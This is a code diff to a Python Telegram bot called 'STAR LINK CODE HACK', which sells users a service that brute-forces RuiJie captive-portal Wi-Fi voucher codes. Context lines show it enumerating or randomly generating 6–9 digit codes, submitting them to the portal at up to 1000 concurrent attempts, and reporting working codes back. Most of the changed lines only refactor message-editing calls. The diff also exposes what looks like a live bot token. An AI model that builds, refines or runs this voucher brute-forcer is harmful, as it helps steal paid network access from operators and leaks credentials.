@@ -5,7 +5,7 @@ STAR LINK CODE HACK — Professional Edition
 Production-grade RuiJie captive-portal voucher scanner.
 
 Author  : God-tier refactor
-Version : 2.0.0
+Version : 2.0.1
 """
 from __future__ import annotations
 
@@ -39,10 +39,10 @@ from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 # ============================================================
 BOT_TOKEN: str = "8706721477:AAH-GJra7cCxa9PWCTGwoBtT76pWlyDqgaE"
 ADMINS: Tuple[str, ...] = ("8797803204",)
-ADMIN_USERNAME: str = "@kiki20251"
+ADMIN_USERNAME: str = "@Nytheris_q"
 
 DB_PATH: str = "bot_data.db"
-WEB_PORT: int = int(os.environ.get("BOT_PORT", "8099"))
+WEB_PORT: int = int(os.environ.get("PORT") or os.environ.get("BOT_PORT") or "8099")
 
 MAX_CONCURRENT_SCANS: int = 40
 CONCURRENCY: int = 1000
@@ -437,7 +437,6 @@ async def is_paid(user_id: str) -> bool:
     if is_admin(user_id):
         return True
     if user_id in paid_users:
-        # Verify it hasn't expired mid-session
         auth = await db_get_auth_list()
         data = auth.get(user_id)
         if data and check_key_expiration(data):
@@ -709,7 +708,6 @@ async def _start_scan(chat_id: int, mode: str, message=None) -> bool:
             await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
         return False
 
-    # Validate mode
     try:
         iter_codes(mode, start_digit=None).__next__()
     except StopIteration:
@@ -719,7 +717,6 @@ async def _start_scan(chat_id: int, mode: str, message=None) -> bool:
             await bot.reply_to(message, str(e))
         return False
 
-    # Acquire slot AFTER all validation
     if not await acquire_scan_slot():
         if message:
             await bot.reply_to(
@@ -733,7 +730,6 @@ async def _start_scan(chat_id: int, mode: str, message=None) -> bool:
         progress_msg = await bot.send_message(chat_id, "🔍 Voucher Code ရှာဖွေနေသည်...")
         scan_id = str(uuid.uuid4())
 
-        # Notify admins (once per URL)
         try:
             user_name = "User"
             if message is not None and getattr(message, "from_user", None):
@@ -864,16 +860,21 @@ async def on_callback(call):
                     "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
                     "PAID USER ဖြစ်ရန် PAID USER ကိုနှိပ်ပါ။"
                 )
-            await bot.edit_message_text(chat_id, call.message.message_id, text, reply_markup=get_main_keyboard())
+            await bot.edit_message_text(
+                text=text,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_main_keyboard(),
+            )
             return
 
         if data == "menu_free_trial":
             if not await is_paid(user_id):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-                    f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
+                         f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
@@ -884,7 +885,12 @@ async def on_callback(call):
                 "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\n"
                 "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်။"
             )
-            await bot.edit_message_text(chat_id, call.message.message_id, text, reply_markup=get_back_keyboard())
+            await bot.edit_message_text(
+                text=text,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_back_keyboard(),
+            )
             return
 
         if data == "menu_paid":
@@ -896,7 +902,12 @@ async def on_callback(call):
                 f"👨‍💻 Admin: {ADMIN_USERNAME}\n\n"
                 "Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ"
             )
-            await bot.edit_message_text(chat_id, call.message.message_id, text, reply_markup=get_paid_keyboard())
+            await bot.edit_message_text(
+                text=text,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_paid_keyboard(),
+            )
             return
 
         if data == "menu_enter_userid":
@@ -905,16 +916,16 @@ async def on_callback(call):
                 paid_users.add(user_id)
                 user_data.setdefault(chat_id, {})
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nMenu မှ ရွေးချယ်ပါ။",
+                    text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nMenu မှ ရွေးချယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_main_keyboard(),
                 )
             elif user_id in auth:
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
             else:
@@ -928,11 +939,11 @@ async def on_callback(call):
                     except Exception:
                         pass
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: {user_id}\n\n"
-                    f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
-                    f"👨‍💻 Admin: {ADMIN_USERNAME}",
+                    text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: {user_id}\n\n"
+                         f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
+                         f"👨‍💻 Admin: {ADMIN_USERNAME}",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
             return
@@ -940,38 +951,43 @@ async def on_callback(call):
         if data == "menu_result":
             if not await is_paid(user_id):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
             results = await db_get_results(user_id)
             text = ("✅ Found Codes:\n" + "\n".join(results)) if results else "📋 Success code မရှိသေးပါ။"
-            await bot.edit_message_text(chat_id, call.message.message_id, text, reply_markup=get_back_keyboard())
+            await bot.edit_message_text(
+                text=text,
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                reply_markup=get_back_keyboard(),
+            )
             return
 
         if data == "menu_recheck":
             if not await is_paid(user_id):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    text="🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
             await bot.edit_message_text(
-                chat_id,
-                call.message.message_id,
-                "🔄 Recheck စတင်နေပါသည်...",
+                text="🔄 Recheck စတင်နေပါသည်...",
+                chat_id=chat_id,
+                message_id=call.message.message_id,
                 reply_markup=get_scam_button_keyboard(),
             )
             await cmd_recheck(call.message)
@@ -994,9 +1010,9 @@ async def on_callback(call):
         if data.startswith("scan_"):
             if not await is_paid(user_id):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
@@ -1004,26 +1020,26 @@ async def on_callback(call):
             user_data.setdefault(chat_id, {})
             if "session_url" not in user_data[chat_id]:
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    text="🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
             if mode in ("6", "7", "8", "9"):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
+                    text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_digit_keyboard(mode),
                 )
                 return
             user_data[chat_id]["selected_mode"] = mode
             user_data[chat_id]["start_digit"] = None
             await bot.edit_message_text(
-                chat_id,
-                call.message.message_id,
-                f"🔍 VOUCHER: {mode}\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
+                text=f"🔍 VOUCHER: {mode}\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
+                chat_id=chat_id,
+                message_id=call.message.message_id,
                 reply_markup=get_start_scam_keyboard(),
             )
             return
@@ -1035,9 +1051,9 @@ async def on_callback(call):
             user_data[chat_id]["start_digit"] = None if digit == "random" else digit
             label = "Random" if digit == "random" else f"{digit} မှစ၍"
             await bot.edit_message_text(
-                chat_id,
-                call.message.message_id,
-                f"🔍 VOUCHER: {mode}\n🔢 ထိပ်စီး: {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
+                text=f"🔍 VOUCHER: {mode}\n🔢 ထိပ်စီး: {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
+                chat_id=chat_id,
+                message_id=call.message.message_id,
                 reply_markup=get_start_scam_keyboard(),
             )
             return
@@ -1045,25 +1061,25 @@ async def on_callback(call):
         if data == "menu_start_scam":
             if not await is_paid(user_id):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "selected_mode" not in user_data.get(chat_id, {}):
                 await bot.edit_message_text(
-                    chat_id,
-                    call.message.message_id,
-                    "❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
+                    text="❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
                     reply_markup=get_voucher_keyboard(),
                 )
                 return
             mode = user_data[chat_id]["selected_mode"]
             await bot.edit_message_text(
-                chat_id,
-                call.message.message_id,
-                f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: {mode}",
+                text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: {mode}",
+                chat_id=chat_id,
+                message_id=call.message.message_id,
                 reply_markup=get_scam_button_keyboard(),
             )
             await _start_scan(chat_id, mode, message=call.message)
@@ -1096,7 +1112,6 @@ def iter_codes(mode: str, start_digit: Optional[str] = None) -> AsyncIterator[st
     """Streaming generator — no huge lists in RAM."""
     if mode in ("6", "7", "8", "9"):
         length = int(mode)
-        # 9-digit: infinite random (10^9 too many to enumerate sequentially)
         if length == 9:
             while True:
                 yield _rand_digits(9)
@@ -1109,7 +1124,6 @@ def iter_codes(mode: str, start_digit: Optional[str] = None) -> AsyncIterator[st
         else:
             start, end = 0, 10 ** length
 
-        # stream sequentially → low memory
         for i in range(start, end):
             yield str(i).zfill(length)
         return
@@ -1368,10 +1382,6 @@ async def perform_check(session_url: str, code: str, chat_id: int,
 
                 async with sess.post(_POST_URL, json=payload, headers=post_headers) as req:
                     response = await req.text()
-                    try:
-                        _ = json.loads(response)
-                    except Exception:
-                        pass
 
         except Exception as e:
             log.debug("perform_check attempt %d: %s", attempt + 1, e)
@@ -1413,9 +1423,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                 else:
                     try:
                         await bot.edit_message_text(
+                            text=f"Success Codes:\n\n{body}",
                             chat_id=chat_id,
                             message_id=success_messages[chat_id],
-                            text=f"Success Codes:\n\n{body}",
                         )
                     except Exception:
                         sent = await bot.send_message(chat_id, f"Success Codes:\n\n{body}")
@@ -1435,9 +1445,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                 else:
                     try:
                         await bot.edit_message_text(
+                            text=f"Limited Codes:\n\n{body}",
                             chat_id=chat_id,
                             message_id=limited_messages[chat_id],
-                            text=f"Limited Codes:\n\n{body}",
                         )
                     except Exception:
                         sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{body}")
@@ -1480,7 +1490,6 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
             if not batch:
                 break
 
-            # Periodic key validity check
             if time.monotonic() - last_key_check >= KEY_RECHECK_INTERVAL:
                 if not await is_paid(str(chat_id)):
                     await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
@@ -1503,7 +1512,11 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
 
             if progress_msg is not None:
                 try:
-                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
+                    await bot.edit_message_text(
+                        text=text,
+                        chat_id=chat_id,
+                        message_id=progress_msg.message_id,
+                    )
                 except Exception:
                     try:
                         new = await bot.send_message(chat_id, text)
@@ -1511,7 +1524,6 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                     except Exception as e:
                         log.debug("progress send error: %s", e)
 
-        # Finished
         if progress_msg is not None:
             found = len(success_texts.get(chat_id, []))
             if total is not None:
@@ -1530,7 +1542,9 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                 )
             try:
                 await bot.edit_message_text(
-                    chat_id=chat_id, message_id=progress_msg.message_id, text=finish
+                    text=finish,
+                    chat_id=chat_id,
+                    message_id=progress_msg.message_id,
                 )
             except Exception:
                 try:
